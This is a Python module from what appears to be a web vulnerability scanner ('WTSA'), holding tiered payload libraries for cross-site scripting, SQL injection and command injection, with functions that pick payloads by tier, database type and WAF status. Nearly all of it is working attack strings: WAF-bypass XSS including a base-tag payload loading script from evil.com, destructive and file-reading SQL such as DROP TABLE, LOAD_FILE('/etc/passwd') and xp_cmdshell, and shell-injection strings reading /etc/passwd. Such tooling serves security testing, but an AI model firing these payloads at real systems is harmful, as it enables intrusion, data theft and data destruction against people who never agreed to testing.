"""
WTSA — Static Detection Signatures
Curated three-tier payload libraries for XSS, SQLi, and CMDi.
Loaded from here on first run; also fetched from Notion for AI-generated payloads.
"""

from ..models import AttackType, PayloadTier, Payload


# ── XSS Payloads ──────────────────────────────────────────────────────────────

XSS_TIER1 = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<input autofocus onfocus=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '<a href="javascript:alert(1)">click</a>',
    '<details open ontoggle=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<marquee onstart=alert(1)>',
]

XSS_TIER2 = [
    # Encoding bypass
    '<scr\x00ipt>alert(1)</scr\x00ipt>',
    '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
    '<svg/onload=alert(1)>',
    '<<script>alert(1)//<</script>',
    '"><ScRiPt>alert(1)</sCrIpT>',
    # Event handlers bypass
    '<div onmouseover="alert(1)">hover</div>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen autofocus onfocus=alert(1)>',
    # Comment injection
    '<!--<img src=--><img src=x onerror=alert(1)>',
    # URL context
    'javascript://%0aalert(1)',
    'JaVaScRiPt:alert(1)',
    # Template injection style
    '${alert(1)}',
    '{{constructor.constructor("alert(1)")()}}',
    # DOM sinks
    '<script>document.write("<img src=x onerror=alert(1)>")</script>',
]

XSS_TIER3 = [
    # WAF bypass: Unicode
    '\u003cscript\u003ealert(1)\u003c/script\u003e',
    # Double URL encoded
    '%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E',
    # HTML5 polyglot
    '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)>',
    # SVG filter
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    # mXSS
    '<listing><img/src="<"onerror=alert(1)>',
    # Mutation bypass
    '<img src=`x` onerror=alert(1)>',
    # CSP bypass via base tag
    '<base href="https://evil.com/"><script src=/payload.js></script>',
    # Iframe srcdoc
    '<iframe srcdoc="<script>parent.alert(1)</script>">',
    # Data URI
    '<object data="data:text/html,<script>alert(1)</script>">',
    # Script type bypass
    '<script type="text/javascript">alert(1)</script>',
]


# ── SQLi Payloads ──────────────────────────────────────────────────────────────

SQLI_TIER1 = {
    "Any": [
        "'",
        "''",
        "`",
        "\"",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin'--",
        "' OR 1=1--",
        "' OR 1=1#",
        "') OR ('1'='1",
    ],
}

SQLI_TIER2 = {
    "MySQL": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' AND 1=2 UNION SELECT 1,2,3--",
        "'; DROP TABLE users--",
        "1; SELECT SLEEP(5)--",
        "1 AND SLEEP(5)",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
        "' AND 1=1 LIMIT 1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables--",
    ],
    "PostgreSQL": [
        "'; SELECT pg_sleep(5)--",
        "1; SELECT pg_sleep(5)--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)--",
        "'; COPY (SELECT '') TO PROGRAM 'id'--",
    ],
    "MSSQL": [
        "'; WAITFOR DELAY '0:0:5'--",
        "1; WAITFOR DELAY '0:0:5'--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; EXEC xp_cmdshell('id')--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    ],
    "SQLite": [
        "' UNION SELECT NULL--",
        "'; SELECT sqlite_version()--",
        "1 AND randomblob(100000000/1)",
        "' AND 1=1--",
    ],
}

SQLI_TIER3 = {
    "MySQL": [
        # Second-order injection
        "admin'-- -",
        # Out-of-band
        "' UNION SELECT LOAD_FILE('/etc/passwd')--",
        # Blind boolean ultra
        "' AND SUBSTRING(VERSION(),1,1)='5",
        "' AND ASCII(SUBSTR((SELECT database()),1,1))>90--",
        # Filter bypass with comments
        "' /*!UNION*/ /*!SELECT*/ NULL--",
        "' UN/**/ION SEL/**/ECT NULL--",
        "'+UNION+SELECT+NULL--",
    ],
}

# Time-based blind payloads — generic
SQLI_TIME_BASED = {
    "MySQL":      "1 AND SLEEP({delay})",
    "PostgreSQL": "1; SELECT pg_sleep({delay})",
    "MSSQL":      "1; WAITFOR DELAY '0:0:{delay}'",
    "SQLite":     "1 AND randomblob({blob})",
    "Any":        "1 AND SLEEP({delay})",
}

# Boolean blind pairs (true / false)
SQLI_BOOL_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--",  "' AND 1=2--"),
    ("1 AND 1=1",    "1 AND 1=2"),
]


# ── CMDi Payloads ──────────────────────────────────────────────────────────────

CMDI_TIER1 = {
    "Linux": [
        "; id",
        "| id",
        "&& id",
        "|| id",
        "` id `",
        "$(id)",
        "; whoami",
        "| whoami",
        "&& whoami",
        "|| whoami",
        "; cat /etc/passwd",
    ],
    "Windows": [
        "& whoami",
        "| whoami",
        "&& whoami",
        "|| whoami",
        "; whoami",
        "& dir",
        "| dir",
    ],
    "Any": [
        "; id",
        "| id",
        "&& id",
        "|| id",
        "$(id)",
        "; whoami",
        "& whoami",
        "| whoami",
    ],
}

CMDI_TIME_BASED = {
    "Linux":   "; sleep {delay}",
    "Windows": "& ping -n {delay} 127.0.0.1",
    "Any":     "; sleep {delay}",
}

CMDI_TIER2 = {
    "Linux": [
        # Whitespace bypass
        ";{IFS}id",
        "|{IFS}id",
        # Encoding bypass
        ";i\\d",
        ";$(printf 'id')",
        # Newline injection
        "%0aid",
        "%0a id",
        # Null byte
        "id%00",
        # Nested
        "`id`",
        "$($(id))",
    ],
}


# ── Payload builder ────────────────────────────────────────────────────────────

def get_payloads_for_context(attack_type: str, tier: int,
                              db_type: str = "Any",
                              waf_detected: bool = False) -> list[Payload]:
    """
    Returns the right payload list for the given context.
    Filters by WAF safety and DB type where applicable.
    """
    result = []

    if "XSS" in attack_type:
        raw = {1: XSS_TIER1, 2: XSS_TIER2, 3: XSS_TIER3}.get(tier, XSS_TIER1)
        for p in raw:
            result.append(Payload(
                name=f"XSS T{tier} — {p[:30]}",
                string=p,
                attack_type=AttackType(attack_type) if attack_type in AttackType._value2member_map_ else AttackType.XSS_REFLECTED,
                tier=PayloadTier(f"Tier {tier} - Static"),
                waf_safe=tier >= 2,
            ))

    elif "SQLi" in attack_type:
        if tier == 1:
            raw = SQLI_TIER1.get("Any", [])
        elif tier == 2:
            raw = SQLI_TIER2.get(db_type, SQLI_TIER2.get("MySQL", []))
        else:
            raw = SQLI_TIER3.get(db_type, SQLI_TIER3.get("MySQL", []))

        for p in raw:
            result.append(Payload(
                name=f"SQLi T{tier} — {p[:30]}",
                string=p,
                attack_type=AttackType.SQLI_CLASSIC,
                tier=PayloadTier(f"Tier {tier} - Static"),
                target_db=[db_type],
            ))

    elif "CMDi" in attack_type:
        os_key = "Linux"  # default
        raw = CMDI_TIER1.get(os_key, CMDI_TIER1["Any"]) if tier == 1 \
              else CMDI_TIER2.get(os_key, [])
        for p in raw:
            result.append(Payload(
                name=f"CMDi T{tier} — {p[:30]}",
                string=p,
                attack_type=AttackType.CMDI,
                tier=PayloadTier(f"Tier {tier} - Static"),
            ))

    return result


def get_timing_payload(attack_type: str, db_type: str = "Any", delay: int = 5) -> str:
    if "SQLi" in attack_type:
        template = SQLI_TIME_BASED.get(db_type, SQLI_TIME_BASED["Any"])
        return template.format(delay=delay, blob=delay * 10_000_000)
    elif "CMDi" in attack_type:
        template = CMDI_TIME_BASED.get("Linux", CMDI_TIME_BASED["Any"])
        return template.format(delay=delay)
    return ""


def get_bool_blind_pairs() -> list[tuple[str, str]]:
    return SQLI_BOOL_PAIRS
